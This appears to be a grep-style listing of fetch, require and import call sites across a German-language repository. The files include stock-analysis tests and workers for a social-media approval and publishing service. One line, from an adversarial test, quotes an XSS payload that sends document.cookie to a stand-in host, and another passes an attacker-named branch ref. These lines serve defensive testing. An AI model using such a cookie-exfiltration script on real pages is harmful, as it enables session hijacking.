-| technical/tests/technical-stock-summary.test.mjs | require(join(root, "technical/engine/templates.js")) |
-| technical/tests/technical-stock-summary.test.mjs | require(join(root, "technical/engine/assistant.js")) |
-| technical/tests/technical-stock-summary.test.mjs | require(join(root, "quant/engines/technical/technical-query.js")) |
-| technical/tests/technical-stock-summary.test.mjs | require(join(root, "quant/engines/technical/price-jumps.js")) |
-| technical/tests/technical-stock-summary.test.mjs | require(join(root, "core/identity.js")) |
-| technical/tests/technical-stock-summary.test.mjs | import(join(root, "scripts/technical/world/build-screener.mjs")) |
-| technical/tests/technical-templates-dq-order.test.mjs | require(join(root, "quant/engines/technical/technical-query.js")) |
-| technical/tests/technical-templates-dq-order.test.mjs | require(join(root, "technical/engine/templates.js")) |
-| technical/tests/technical-templates-dq-order.test.mjs | require(join(root, "technical/engine/assistant.js")) |
-| technical/tests/technical-templates.test.mjs | require(join(root, "quant/engines/technical/technical-query.js")) |
-| technical/tests/technical-templates.test.mjs | require(join(root, "technical/engine/templates.js")) |
-| technical/tests/technical-templates.test.mjs | require(join(root, "technical/engine/model.js")) |
-| technical/tests/technical-world-context.test.mjs | require(join(root, "technical/engine/world-context.js")) |
-| technical/tests/technical-world-context.test.mjs | require(join(root, "quant/engines/factor-evidence.js")) |
-| technical/tests/technical-world-context.test.mjs | require(join(root, "technical/engine/model.js")) |
-| technical/tests/technical-world-context.test.mjs | require(join(root, "core/identity.js")) |
-| technical/tests/technical-world.test.mjs | require(join(root, "technical/engine/model.js")) |
-| technical/tests/technical-world.test.mjs | require(join(root, "quant/engines/technical/technical-query.js")) |
-| technical/tests/technical-world.test.mjs | import(join(root, "scripts/vu2/release-id.mjs")) |
-| technical/tests/technical-world.test.mjs | require(join(root, "quant/engines/technical/query-text.js")) |
-| technical/tests/technical-world.test.mjs | require(join(root, "core/listing-staleness.js")) |
-| technical/tests/technical-world.test.mjs | import(join(root, "scripts/technical/world/signal-evidence.mjs")) |
-| vorsorge/app.js | fetch(url, { cache: "no-cache" }).then(function (r) { if (!r.ok) throw new Error(r.status + " " + url) |
-| willkommen/app.js | fetch(url, { cache: 'no-cache' }).then(function (r) { if (!r.ok) throw new Error('HTTP ' + r.status) |
-| willkommen/app.js | fetch(path, { cache: 'default', credentials: 'omit' }).then(function (r) { if (!r.ok) throw new Error('HTTP_' + r.status) |
-| willkommen/start/start.js | fetch(path, { cache: 'default', credentials: 'omit' }).then(function (r) { if (!r.ok) throw new Error('HTTP_' + r.status) |
-| worker-waker/src/index.mjs | fetch(url, { headers: kopf }) |
-| worker-waker/src/index.mjs | fetch(     "https://api.github.com/repos/" + env.GITHUB_REPO + |
-| worker-waker/src/index.mjs | fetch(request, env) { |
-| worker-waker/tests/waker.test.mjs | import(join(root, "worker-waker", "src", "index.mjs")) |
-| worker-waker/tests/waker.test.mjs | import(join(root, "worker-waker", "src", "github-app.mjs")) |
-| worker-waker/tests/waker.test.mjs | import(join(root, "worker-waker", "src", "index.mjs")) |
-| worker-waker/tests/waker.test.mjs | fetch(     new Request("https://x/status"), umgebung()) |
-| worker-waker/tests/waker.test.mjs | fetch(     new Request("https://x/status"), { GITHUB_REPO: REPO, GITHUB_APP_ID: APP_ID }) |
-| worker-waker/tests/waker.test.mjs | import(join(root, "worker-waker", "src", "index.mjs")) |
-| worker/src/index.mjs | fetch(request, env, ctx) { |
-| worker/src/index.mjs | fetch(new Request("https://vu-live/health")) |
-| worker/src/index.mjs | fetch(request) |
-| worker/src/tiingo-link.mjs | fetch() mit einem Upgrade-Kopf, und das Ergebnis traegt die Methoden |
-| worker/src/vu-live.mjs | fetch(request) { |
-| worker/tests/vu-live.test.mjs | fetch(anfrage("https://vu-live/live", { Upgrade: "websocket" })) |
-| worker/tests/vu-live.test.mjs | fetch(anfrage("https://vu-live/live", { Upgrade: "websocket" })) |
-| worker/tests/vu-live.test.mjs | fetch(     anfrage("https://live.visionuniverse.de/live", |
-| worker/tests/vu-live.test.mjs | fetch(     anfrage("https://live.visionuniverse.de/live", |
-| worker/tests/vu-live.test.mjs | fetch(     anfrage("https://live.visionuniverse.de/live", { Upgrade: "websocket" }), env) |
-| worker/tests/vu-live.test.mjs | fetch(     anfrage("https://live.visionuniverse.de/live", { Origin: "https://research.visionuniverse.de" }), |
-| worker/tests/vu-live.test.mjs | fetch(     anfrage("https://live.visionuniverse.de/health", { Origin: "https://research.visionuniverse.de" }), |
-| worker/tests/vu-live.test.mjs | fetch(anfrage("https://live.visionuniverse.de/"), env) |
-| worker/tests/vu-live.test.mjs | fetch(anfrage("https://live.visionuniverse.de/kurse"), env) |
-| workers/vision-universe-social/src/approval.js | fetch(       "https://api.github.com/repos/" + repo + "/actions/workflows/" + |
-| workers/vision-universe-social/src/index.js | fetch(request, env, ctx) { |
-| workers/vision-universe-social/tests/approval-adversarial.test.mjs | fetch(request("/social/approval/queue" + KEY, { |
-| workers/vision-universe-social/tests/approval-adversarial.test.mjs | fetch(request("/approval/session", { |
-| workers/vision-universe-social/tests/approval-adversarial.test.mjs | fetch(request(pfad, { |
-| workers/vision-universe-social/tests/approval-adversarial.test.mjs | fetch(request(pfad, { method: methode }), env) |
-| workers/vision-universe-social/tests/approval-adversarial.test.mjs | fetch(request(pfad, { headers: { cookie: alt } }), env) |
-| workers/vision-universe-social/tests/approval-adversarial.test.mjs | fetch(request("/approval", { headers: { cookie: c } }), env) |
-| workers/vision-universe-social/tests/approval-adversarial.test.mjs | fetch(request("/social/approval/queue" + KEY, { method: "POST", |
-| workers/vision-universe-social/tests/approval-adversarial.test.mjs | fetch(request("/approval", { headers: { cookie } }), env) |
-| workers/vision-universe-social/tests/approval-adversarial.test.mjs | fetch(request("/approval/" + ID, { headers: { cookie } }), env) |
-| workers/vision-universe-social/tests/approval-adversarial.test.mjs | fetch(request("/approval"), env), |
-| workers/vision-universe-social/tests/approval-adversarial.test.mjs | fetch(request("/approval", { headers: { cookie } }), env), |
-| workers/vision-universe-social/tests/approval-adversarial.test.mjs | fetch(request("/approval/" + ID, { headers: { cookie } }), env), |
-| workers/vision-universe-social/tests/approval-adversarial.test.mjs | fetch(request("/approval/session", { method: "POST", |
-| workers/vision-universe-social/tests/approval-adversarial.test.mjs | fetch("//x.invalid?c="+document.cookie)</script>' + |
-| workers/vision-universe-social/tests/approval-adversarial.test.mjs | fetch(request("/approval/" + ID, { headers: { cookie } }), env), |
-| workers/vision-universe-social/tests/approval-adversarial.test.mjs | fetch(request("/social/approval/queue" + KEY, { |
-| workers/vision-universe-social/tests/approval-adversarial.test.mjs | fetch(request(pfad + "?fingerprint=" + hash, |
-| workers/vision-universe-social/tests/approval-adversarial.test.mjs | fetch(request( |
-| workers/vision-universe-social/tests/approval-adversarial.test.mjs | fetch(request("/approval/session", { method: "POST", |
-| workers/vision-universe-social/tests/approval-adversarial.test.mjs | fetch(request("/social/approval/queue" + KEY, { |
-| workers/vision-universe-social/tests/approval-adversarial.test.mjs | fetch(request("/social/approval/queue" + KEY, { |
-| workers/vision-universe-social/tests/approval-adversarial.test.mjs | fetch(request("/social/approval/queue" + KEY, { |
-| workers/vision-universe-social/tests/approval-adversarial.test.mjs | fetch(request("/approval/session", { method: "POST", |
-| workers/vision-universe-social/tests/approval-adversarial.test.mjs | fetch(request("/approval", |
-| workers/vision-universe-social/tests/approval-asset-gate.test.mjs | fetch(request("/social/approval/queue" + KEY, { |
-| workers/vision-universe-social/tests/approval-asset-gate.test.mjs | fetch(request("/approval/session", { |
-| workers/vision-universe-social/tests/approval-asset-gate.test.mjs | fetch(request("/approval/" + ID, { headers: { cookie } }), env) |
-| workers/vision-universe-social/tests/approval-asset-gate.test.mjs | fetch(request(pfad, { |
-| workers/vision-universe-social/tests/approval-asset-gate.test.mjs | fetch(request("/approval/" + ID, { headers: { cookie } }), env) |
-| workers/vision-universe-social/tests/approval-asset-gate.test.mjs | fetch(request("/approval/" + ID, { headers: { cookie } }), env) |
-| workers/vision-universe-social/tests/approval-card.test.mjs | fetch(request("/social/approval/queue" + KEY, { |
-| workers/vision-universe-social/tests/approval-card.test.mjs | fetch(request("/approval/session", { |
-| workers/vision-universe-social/tests/approval-card.test.mjs | fetch(request("/approval/" + id, { headers: { cookie } }), env) |
-| workers/vision-universe-social/tests/approval-card.test.mjs | fetch(request("/approval/" + ID), env) |
-| workers/vision-universe-social/tests/approval-card.test.mjs | fetch(     request("/approval/" + encodeURIComponent(e.candidateId), { headers: { cookie } }), env) |
-| workers/vision-universe-social/tests/approval-card.test.mjs | fetch(request("/approval/" + ID, { headers: { cookie } }), env) |
-| workers/vision-universe-social/tests/approval-content-status.test.mjs | fetch(request("/social/approval/queue", { |
-| workers/vision-universe-social/tests/approval-content-status.test.mjs | fetch(request("/social/approval/queue", { |
-| workers/vision-universe-social/tests/approval-content-status.test.mjs | fetch(request("/social/approval/queue", { |
-| workers/vision-universe-social/tests/approval-content-status.test.mjs | fetch(request("/social/approval/queue", { |
-| workers/vision-universe-social/tests/approval-content-status.test.mjs | fetch(request("/approval/session", { |
-| workers/vision-universe-social/tests/approval-content-status.test.mjs | fetch(request("/approval", { headers: { cookie } }), env) |
-| workers/vision-universe-social/tests/approval-decision.test.mjs | fetch(request("/social/approval/queue" + KEY, { |
-| workers/vision-universe-social/tests/approval-decision.test.mjs | fetch(request("/approval/session", { |
-| workers/vision-universe-social/tests/approval-decision.test.mjs | fetch(request(pfad, { |
-| workers/vision-universe-social/tests/approval-decision.test.mjs | fetch(request("/approval/" + ID, { headers: { cookie } }), env) |
-| workers/vision-universe-social/tests/approval-decision.test.mjs | fetch(request("/approval", { headers: { cookie } }), env)).text() |
-| workers/vision-universe-social/tests/approval-decision.test.mjs | fetch(request("/social/approval/queue" + KEY, { method: "POST", |
-| workers/vision-universe-social/tests/approval-decision.test.mjs | fetch(request(pfad, { method: "POST", |
-| workers/vision-universe-social/tests/approval-decision.test.mjs | fetch(request(`/approval/${ID}/publish` + KEY, { |
-| workers/vision-universe-social/tests/approval-decision.test.mjs | fetch(request(pfad, { headers: { cookie } }), env) |
-| workers/vision-universe-social/tests/approval-decision.test.mjs | fetch(request("/social/meta/publish", { method: "POST", |
-| workers/vision-universe-social/tests/approval-decision.test.mjs | fetch(request("/social/meta/publish" + KEY, { method: "POST", |
-| workers/vision-universe-social/tests/approval-decision.test.mjs | fetch(request("/social/meta/publish" + KEY, { method: "POST", |
-| workers/vision-universe-social/tests/approval-decision.test.mjs | fetch(request("/approval", { headers: { cookie } }), env) |
-| workers/vision-universe-social/tests/approval-manual-run.test.mjs | fetch(request("/approval/session", { |
-| workers/vision-universe-social/tests/approval-manual-run.test.mjs | fetch(request("/approval/run", { |
-| workers/vision-universe-social/tests/approval-manual-run.test.mjs | fetch(request("/approval"), env) |
-| workers/vision-universe-social/tests/approval-manual-run.test.mjs | fetch(request("/approval/run", { |
-| workers/vision-universe-social/tests/approval-queue.test.mjs | fetch(request("/social/approval/queue" + KEY, { |
-| workers/vision-universe-social/tests/approval-queue.test.mjs | fetch(request("/approval/session", { |
-| workers/vision-universe-social/tests/approval-queue.test.mjs | fetch(request("/social/approval/queue", { |
-| workers/vision-universe-social/tests/approval-queue.test.mjs | fetch(request("/social/approval/queue", { |
-| workers/vision-universe-social/tests/approval-queue.test.mjs | fetch(request("/social/approval/queue" + KEY), env) |
-| workers/vision-universe-social/tests/approval-queue.test.mjs | fetch(request("/approval", { headers: { cookie } }), env) |
-| workers/vision-universe-social/tests/approval-queue.test.mjs | fetch(request("/approval", { headers: { cookie } }), env)).text() |
-| workers/vision-universe-social/tests/approval-queue.test.mjs | fetch(request("/approval", { headers: { cookie } }), env)).text() |
-| workers/vision-universe-social/tests/approval-queue.test.mjs | fetch(request("/approval", { headers: { cookie } }), env)).text() |
-| workers/vision-universe-social/tests/approval-queue.test.mjs | fetch(request("/approval", { headers: { cookie } }), env)).text() |
-| workers/vision-universe-social/tests/approval-queue.test.mjs | fetch(request(pfad), env) |
-| workers/vision-universe-social/tests/approval-queue.test.mjs | fetch(request("/approval"), env)).text() |
-| workers/vision-universe-social/tests/approval-queue.test.mjs | fetch(request("/approval", { headers: { cookie } }), env)).text() |
-| workers/vision-universe-social/tests/approval-session.test.mjs | fetch(request("/approval/session", { |
-| workers/vision-universe-social/tests/approval-session.test.mjs | fetch(request("/approval"), env) |
-| workers/vision-universe-social/tests/approval-session.test.mjs | fetch(request("/approval"), env) |
-| workers/vision-universe-social/tests/approval-session.test.mjs | fetch(     request("/approval?key=" + encodeURIComponent(TEST_ADMIN_KEY)), env) |
-| workers/vision-universe-social/tests/approval-session.test.mjs | fetch(request( |
-| workers/vision-universe-social/tests/approval-session.test.mjs | fetch(request("/approval", { headers: { cookie } }), env) |
-| workers/vision-universe-social/tests/approval-session.test.mjs | fetch(request("/approval", { headers: { cookie } }), env) |
-| workers/vision-universe-social/tests/approval-session.test.mjs | fetch(request("/approval", { headers: { cookie } }), env) |
-| workers/vision-universe-social/tests/approval-session.test.mjs | fetch(request("/approval", { headers: { cookie } }), gedreht) |
-| workers/vision-universe-social/tests/approval-session.test.mjs | fetch(request("/approval", { headers: { cookie: probe } }), env) |
-| workers/vision-universe-social/tests/approval-session.test.mjs | fetch(request("/approval", { headers: { cookie } }), env) |
-| workers/vision-universe-social/tests/approval-session.test.mjs | fetch(request("/approval"), ohne) |
-| workers/vision-universe-social/tests/approval-session.test.mjs | fetch(request("/approval/session", { |
-| workers/vision-universe-social/tests/approval-session.test.mjs | fetch(request("/approval/session", { |
-| workers/vision-universe-social/tests/approval-session.test.mjs | fetch(request(pfad), env) |
-| workers/vision-universe-social/tests/approval-session.test.mjs | fetch(     request("/approval/queue", { headers: { cookie } }), env) |
-| workers/vision-universe-social/tests/approval-session.test.mjs | fetch(request(pfad, { headers: { cookie } }), env) |
-| workers/vision-universe-social/tests/approval-session.test.mjs | fetch(       request(pfad, { method: "POST", headers: { cookie } }), env) |
-| workers/vision-universe-social/tests/approval-session.test.mjs | fetch(     request("/approval/logout", { method: "POST", headers: { cookie } }), env) |
-| workers/vision-universe-social/tests/approval-session.test.mjs | fetch(request("/approval", { headers: { cookie } }), env) |
-| workers/vision-universe-social/tests/approval-session.test.mjs | fetch(request("/approval/session"), env) |
-| workers/vision-universe-social/tests/approval-session.test.mjs | fetch(request("/health"), env) |
-| workers/vision-universe-social/tests/approval-session.test.mjs | fetch(request("/social/meta/status"), env) |
-| workers/vision-universe-social/tests/approval-session.test.mjs | fetch(request("/social/meta/status" + adminQuery), env) |
-| workers/vision-universe-social/tests/approval-session.test.mjs | fetch(request("/"), env)).status, 401) |
-| workers/vision-universe-social/tests/approval-session.test.mjs | fetch(request("/" + adminQuery), env)).status, 200) |
-| workers/vision-universe-social/tests/approval-session.test.mjs | fetch(request("/gibtesnicht" + adminQuery), env) |
-| workers/vision-universe-social/tests/approval.test.mjs | fetch(ruf(INHALTE), env) |
-| workers/vision-universe-social/tests/approval.test.mjs | fetch(ruf(Object.assign({ |
-| workers/vision-universe-social/tests/approval.test.mjs | fetch(ruf(Object.assign({ approval: await freigabeFuer(INHALTE) }, INHALTE)), env) |
-| workers/vision-universe-social/tests/approval.test.mjs | fetch(ruf(INHALTE), env) |
-| workers/vision-universe-social/tests/approval.test.mjs | fetch(ruf(Object.assign({ |
-| workers/vision-universe-social/tests/approval.test.mjs | fetch(ruf(Object.assign({ |
-| workers/vision-universe-social/tests/approval.test.mjs | fetch(ruf(Object.assign({}, INHALTE, { |
-| workers/vision-universe-social/tests/approval.test.mjs | fetch(ruf(Object.assign({}, INHALTE, { |
-| workers/vision-universe-social/tests/approval.test.mjs | fetch(ruf(Object.assign({}, INHALTE, { |
-| workers/vision-universe-social/tests/approval.test.mjs | fetch(request("/social/meta/publish", { |
-| workers/vision-universe-social/tests/approval.test.mjs | fetch(ruf(Object.assign({ |
-| workers/vision-universe-social/tests/approval.test.mjs | fetch(ruf(Object.assign({ approval: freigabe }, INHALTE)), env) |
-| workers/vision-universe-social/tests/approval.test.mjs | fetch(ruf(Object.assign({ approval: freigabe }, INHALTE)), env) |
-| workers/vision-universe-social/tests/approval.test.mjs | fetch(ruf(Object.assign({ |
-| workers/vision-universe-social/tests/asset-fingerprint.test.mjs | fetch(request("/social/meta/publish", { |
-| workers/vision-universe-social/tests/harness.mjs | fetch(     request("/social/meta/connect?key=" + encodeURIComponent(env.VU_SOCIAL_ADMIN_KEY)), env) |
-| workers/vision-universe-social/tests/harness.mjs | fetch(request( |
-| workers/vision-universe-social/tests/hashtag-capability.test.mjs | fetch(request("/social/meta/hashtag-capability"), env) |
-| workers/vision-universe-social/tests/hashtag-capability.test.mjs | fetch(request("/social/meta/hashtag-capability", |
-| workers/vision-universe-social/tests/hashtag-capability.test.mjs | fetch(request("/social/meta/hashtag-capability", |
-| workers/vision-universe-social/tests/hashtag-capability.test.mjs | fetch(request("/social/meta/hashtag-capability", |
-| workers/vision-universe-social/tests/hashtag-capability.test.mjs | fetch(request("/social/meta/hashtag-capability", |
-| workers/vision-universe-social/tests/hashtag-capability.test.mjs | fetch(request("/social/meta/hashtag-capability", |
-| workers/vision-universe-social/tests/hashtag-capability.test.mjs | fetch(request( |
-| workers/vision-universe-social/tests/hashtag-capability.test.mjs | fetch(request("/social/meta/hashtag-capability", |
-| workers/vision-universe-social/tests/hashtag-capability.test.mjs | fetch(request("/social/meta/hashtag-capability", |
-| workers/vision-universe-social/tests/hashtag-capability.test.mjs | fetch(request("/social/meta/hashtag-capability", |
-| workers/vision-universe-social/tests/hashtag-capability.test.mjs | fetch(request("/social/meta/hashtag-capability", |
-| workers/vision-universe-social/tests/insights.test.mjs | fetch(request("/social/meta/insights"), env) |
-| workers/vision-universe-social/tests/insights.test.mjs | fetch(     request("/social/meta/insights", { method: "POST", |
-| workers/vision-universe-social/tests/insights.test.mjs | fetch(ruf(), env) |
-| workers/vision-universe-social/tests/insights.test.mjs | fetch(ruf(`?media=${MEDIA}`), env)).json() |
-| workers/vision-universe-social/tests/insights.test.mjs | fetch(ruf(`?media=${MEDIA}`), env) |
-| workers/vision-universe-social/tests/insights.test.mjs | fetch(ruf(), env)).json() |
-| workers/vision-universe-social/tests/insights.test.mjs | fetch(ruf(`?media=${MEDIA}`), env)).json() |
-| workers/vision-universe-social/tests/insights.test.mjs | fetch(ruf(`?media=${MEDIA}`), env)).json() |
-| workers/vision-universe-social/tests/insights.test.mjs | fetch(ruf(`?media=${MEDIA}`), env)).json() |
-| workers/vision-universe-social/tests/insights.test.mjs | fetch(ruf(`?media=${MEDIA}`), env)).json() |
-| workers/vision-universe-social/tests/insights.test.mjs | fetch(ruf(`?media=${MEDIA}`), env)).json() |
-| workers/vision-universe-social/tests/insights.test.mjs | fetch(ruf(`?media=${MEDIA}`), env) |
-| workers/vision-universe-social/tests/insights.test.mjs | fetch(ruf(`?media=${viele}`), env)).json() |
-| workers/vision-universe-social/tests/insights.test.mjs | fetch(ruf("?media=1,2,3"), env)).json() |
-| workers/vision-universe-social/tests/insights.test.mjs | fetch(ruf(`?media=${MEDIA}`), env)).json() |
-| workers/vision-universe-social/tests/insights.test.mjs | fetch(ruf("?media=1,2,3,4,5"), env)).json() |
-| workers/vision-universe-social/tests/insights.test.mjs | fetch(request("/health"), env)).json() |
-| workers/vision-universe-social/tests/insights.test.mjs | fetch(request("/health"), env)).json() |
-| workers/vision-universe-social/tests/insights.test.mjs | fetch(request("/health"), env) |
-| workers/vision-universe-social/tests/manual-run-adversarial.test.mjs | fetch(request("/approval/session", { |
-| workers/vision-universe-social/tests/manual-run-adversarial.test.mjs | fetch(request("/approval/run", Object.assign({ |
-| workers/vision-universe-social/tests/manual-run-adversarial.test.mjs | fetch(request("/approval/run?ref=angreifer-zweig", { |
-| workers/vision-universe-social/tests/oauth.test.mjs | fetch(request("/health"), {}) |
-| workers/vision-universe-social/tests/oauth.test.mjs | fetch(request(path), env) |
-| workers/vision-universe-social/tests/oauth.test.mjs | fetch(request("/social/meta/status?key=zu-kurz"), env) |
-| workers/vision-universe-social/tests/oauth.test.mjs | fetch(request("/social/meta/connect" + adminQuery), env) |
-| workers/vision-universe-social/tests/oauth.test.mjs | fetch(request("/social/meta/callback"), env) |
-| workers/vision-universe-social/tests/oauth.test.mjs | fetch(     request("/social/meta/callback?error=access_denied&error_description=User+denied"), env) |
-| workers/vision-universe-social/tests/oauth.test.mjs | fetch(request( |
-| workers/vision-universe-social/tests/oauth.test.mjs | fetch(request( |
-| workers/vision-universe-social/tests/oauth.test.mjs | fetch(request( |
-| workers/vision-universe-social/tests/oauth.test.mjs | fetch(request("/social/meta/status" + adminQuery), env) |
-| workers/vision-universe-social/tests/oauth.test.mjs | fetch(request("/social/meta/verify" + adminQuery), env) |
-| workers/vision-universe-social/tests/oauth.test.mjs | fetch(request("/social/meta/verify" + adminQuery), env) |
-| workers/vision-universe-social/tests/oauth.test.mjs | fetch(request("/social/meta/disconnect" + adminQuery), env) |
-| workers/vision-universe-social/tests/oauth.test.mjs | fetch(     request("/social/meta/disconnect" + adminQuery, { method: "POST" }), env) |
-| workers/vision-universe-social/tests/owner-configuration.test.mjs | fetch(     request("/social/meta/connect?key=" + encodeURIComponent(TEST_ADMIN_KEY)), env) |
-| workers/vision-universe-social/tests/profile.test.mjs | fetch(request("/social/meta/profile"), env)).status, 401) |
-| workers/vision-universe-social/tests/profile.test.mjs | fetch(ruf("", { method: "POST" }), env)).status, 405) |
-| workers/vision-universe-social/tests/profile.test.mjs | fetch(ruf("?limit=2"), env) |
-| workers/vision-universe-social/tests/profile.test.mjs | fetch(ruf(), env)).status, 409) |
-| workers/vision-universe-social/tests/profile.test.mjs | fetch(ruf(), env)).status, 403) |
-| workers/vision-universe-social/tests/profile.test.mjs | fetch(ruf("?limit=500&after=ABC"), env) |
-| workers/vision-universe-social/tests/publish-idempotent.test.mjs | fetch(ruf(NORMAL), env) |
-| workers/vision-universe-social/tests/publish-idempotent.test.mjs | fetch(ruf(NORMAL), env) |
-| workers/vision-universe-social/tests/publish-idempotent.test.mjs | fetch(ruf(NORMAL), env) |
-| workers/vision-universe-social/tests/publish-idempotent.test.mjs | fetch(     request("/social/meta/publish", { method: "POST", body: JSON.stringify(NORMAL) }), env) |
-| workers/vision-universe-social/tests/publish-idempotent.test.mjs | fetch(ruf(null, "GET"), env) |
-| workers/vision-universe-social/tests/publish-idempotent.test.mjs | fetch(ruf({ imageUrl: BILD }), env) |
-| workers/vision-universe-social/tests/publish-idempotent.test.mjs | fetch(ruf({ contentId: INHALT }), env) |
-| workers/vision-universe-social/tests/publish-idempotent.test.mjs | fetch(ruf(NORMAL), env) |
-| workers/vision-universe-social/tests/publish-idempotent.test.mjs | fetch(ruf(NORMAL), env) |
-| workers/vision-universe-social/tests/publish-idempotent.test.mjs | fetch(ruf(NORMAL), env) |
-| workers/vision-universe-social/tests/publish-idempotent.test.mjs | fetch(ruf(NORMAL), env) |
-| workers/vision-universe-social/tests/publish-idempotent.test.mjs | fetch(ruf(NORMAL), env) |
-| workers/vision-universe-social/tests/publish-idempotent.test.mjs | fetch(ruf({ contentId: INHALT, imageUrl: BILD, caption: text }), env) |
-| workers/vision-universe-social/tests/publish-idempotent.test.mjs | fetch(ruf(NORMAL), env) |
-| workers/vision-universe-social/tests/publish-idempotent.test.mjs | fetch(ruf(NORMAL), env) |
-| workers/vision-universe-social/tests/publish-idempotent.test.mjs | fetch(ruf(NORMAL), env) |
-| workers/vision-universe-social/tests/publish-idempotent.test.mjs | fetch(ruf(NORMAL), env) |
-| workers/vision-universe-social/tests/publish-idempotent.test.mjs | fetch(ruf(NORMAL), env) |
-| workers/vision-universe-social/tests/publish-idempotent.test.mjs | fetch(     ruf({ contentId: "vu-content-2026-09-16-002", imageUrl: BILD, caption: "Zwei." }), env) |
-| workers/vision-universe-social/tests/publish-idempotent.test.mjs | fetch(ruf(NORMAL), env) |
-| workers/vision-universe-social/tests/publish-idempotent.test.mjs | fetch(ruf(NORMAL), env) |
-| workers/vision-universe-social/tests/publish-idempotent.test.mjs | fetch(ruf(NORMAL), env) |
-| workers/vision-universe-social/tests/publish-idempotent.test.mjs | fetch(ruf(NORMAL), env) |
-| workers/vision-universe-social/tests/publish-idempotent.test.mjs | fetch(ruf(NORMAL), env) |
-| workers/vision-universe-social/tests/publish-idempotent.test.mjs | fetch(ruf(NORMAL), env) |
-| workers/vision-universe-social/tests/reel-background.test.mjs | fetch(request("/approval/session", { method: "POST", |
-| workers/vision-universe-social/tests/reel-background.test.mjs | fetch(request(pfad, { method: "POST", |
-| workers/vision-universe-social/tests/reel-background.test.mjs | fetch(post("/social/reel/prepare", { contentId: INHALT, videoUrl: VIDEO, caption: TEXT }), env) |
-| workers/vision-universe-social/tests/reel-background.test.mjs | fetch(request(`/approval/${prep.candidateId}`, { headers: { cookie } }), env)).text() |
-| workers/vision-universe-social/tests/reel-background.test.mjs | fetch(post("/social/reel/prepare", { contentId: INHALT, videoUrl: VIDEO, caption: TEXT }), env) |
-| workers/vision-universe-social/tests/reel.test.mjs | fetch(post("/social/reel/prepare", |
-| workers/vision-universe-social/tests/reel.test.mjs | fetch(post("/social/meta/publish", Object.assign({ |
-| workers/vision-universe-social/tests/reel.test.mjs | fetch(request("/social/reel/prepare", { method: "POST", body: "{}" }), env)).status, 401) |
-| workers/vision-universe-social/tests/reel.test.mjs | fetch(request("/social/reel/prepare" + KEY), env)).status, 405) |
-| workers/vision-universe-social/tests/reel.test.mjs | fetch(post("/social/meta/publish", { contentId: INHALT, mediaType: "REELS", videoUrl: VIDEO, caption: TEXT }), env) |
-| workers/vision-universe-social/tests/reel.test.mjs | fetch(request("/social/meta/publish", { method: "POST", body: "{}" }), env) |
-| workers/vision-universe-social/tests/reel.test.mjs | fetch(request("/approval/session", { method: "POST", |
-| workers/vision-universe-social/tests/reel.test.mjs | fetch(request(pfad, { method: "POST", |
-| workers/vision-universe-social/tests/reel.test.mjs | fetch(request("/approval/" + prep.candidateId, { headers: { cookie } }), env) |
-| workers/vision-universe-social/tests/reel.test.mjs | fetch(request("/social/reel/status?contentId=" + INHALT), env)).status, 401) |
-| workers/vision-universe-social/tests/reel.test.mjs | fetch(request("/social/reel/status" + KEY + "&contentId=" + INHALT), env)).json() |
-| workers/vision-universe-social/tests/reel.test.mjs | fetch(request("/social/reel/status" + KEY + "&contentId=" + INHALT), env)).json() |
-| workers/vision-universe-social/tests/reel.test.mjs | fetch(request("/social/reel/status" + KEY + "&contentId=" + INHALT), env)).json() |
-| workers/vision-universe-social/tests/reel.test.mjs | fetch(request("/social/reel/status" + KEY + "&contentId=" + INHALT), env)).json() |
-| workers/vision-universe-social/tests/reel.test.mjs | fetch(request(`/approval/${prep.candidateId}`, { headers: { cookie } }), env) |
-| workers/vision-universe-social/tests/security.test.mjs | fetch(request("/social/meta/verify" + adminQuery), env) |
-| workers/vision-universe-social/tests/security.test.mjs | fetch(request("/social/meta/status" + adminQuery), env) |
-| workers/vision-universe-social/tests/security.test.mjs | fetch(request("/social/meta/status" + adminQuery), env) |
-| workers/vision-universe-social/tests/security.test.mjs | fetch(request("/social/meta/gibtesnicht" + adminQuery), env) |
-| workers/vision-universe-social/tests/security.test.mjs | fetch(     request("/social/meta/connect" + adminQuery, { method: "POST" }), env) |
-| workers/vision-universe-social/tests/security.test.mjs | fetch(request("/health"), env) |
-| workers/vision-universe-social/tests/smoke-publish.test.mjs | fetch(ruf(), env) |
-| workers/vision-universe-social/tests/smoke-publish.test.mjs | fetch(ruf(), env) |
-| workers/vision-universe-social/tests/smoke-publish.test.mjs | fetch(ruf(), env) |
-| workers/vision-universe-social/tests/smoke-publish.test.mjs | fetch(ruf(""), env) |
-| workers/vision-universe-social/tests/smoke-publish.test.mjs | fetch(     request(`/social/meta/smoke-publish?confirm=${CONFIRM}`, { method: "POST" }), env) |
-| workers/vision-universe-social/tests/smoke-publish.test.mjs | fetch(ruf(`?confirm=${CONFIRM}`, "GET"), env) |
-| workers/vision-universe-social/tests/smoke-publish.test.mjs | fetch(ruf(), env) |
-| workers/vision-universe-social/tests/smoke-publish.test.mjs | fetch(ruf(), env) |
-| workers/vision-universe-social/tests/smoke-publish.test.mjs | fetch(ruf(), env) |
-| workers/vision-universe-social/tests/smoke-publish.test.mjs | fetch(ruf(), env) |
-| workers/vision-universe-social/tests/smoke-publish.test.mjs | fetch(ruf(`?confirm=${CONFIRM}&again=${AGAIN}`), env) |
-| workers/vision-universe-social/tests/smoke-publish.test.mjs | fetch(ruf(), env) |
-| workers/vision-universe-social/tests/smoke-publish.test.mjs | fetch(ruf(), env) |
-| workers/vision-universe-social/tests/smoke-publish.test.mjs | fetch(ruf(), env) |
-| workers/vision-universe-social/tests/smoke-publish.test.mjs | fetch(ruf(), env) |
-| workers/vision-universe-social/tests/smoke-publish.test.mjs | fetch(ruf(), env) |
-| workers/vision-universe-social/tests/smoke-publish.test.mjs | fetch(ruf(), env) |
-| workers/vision-universe-social/tests/smoke-publish.test.mjs | fetch(ruf(), env) |
-| workers/vision-universe-social/tests/smoke-publish.test.mjs | fetch(ruf(), env) |
-| workers/vision-universe-social/tests/smoke-publish.test.mjs | fetch(ruf(), env) |
-| workers/vision-universe-social/tests/smoke-publish.test.mjs | fetch(     request("/social/meta/status", { headers: { authorization: `Bearer ${TEST_ADMIN_KEY}` } }), |
-| workers/vision-universe-social/tests/smoke-publish.test.mjs | fetch(request("/social/meta/status"), env) |
-| workers/vision-universe-social/tests/smoke-publish.test.mjs | fetch(ruf(), env) |
-| workers/vision-universe-social/tests/smoke-publish.test.mjs | fetch(ruf(), env) |
-| workers/vision-universe-social/tests/smoke-publish.test.mjs | fetch(ruf(`&again=${AGAIN}`), env2) |
-| workers/vu-account/src/index.mjs | fetch(request, env) { |
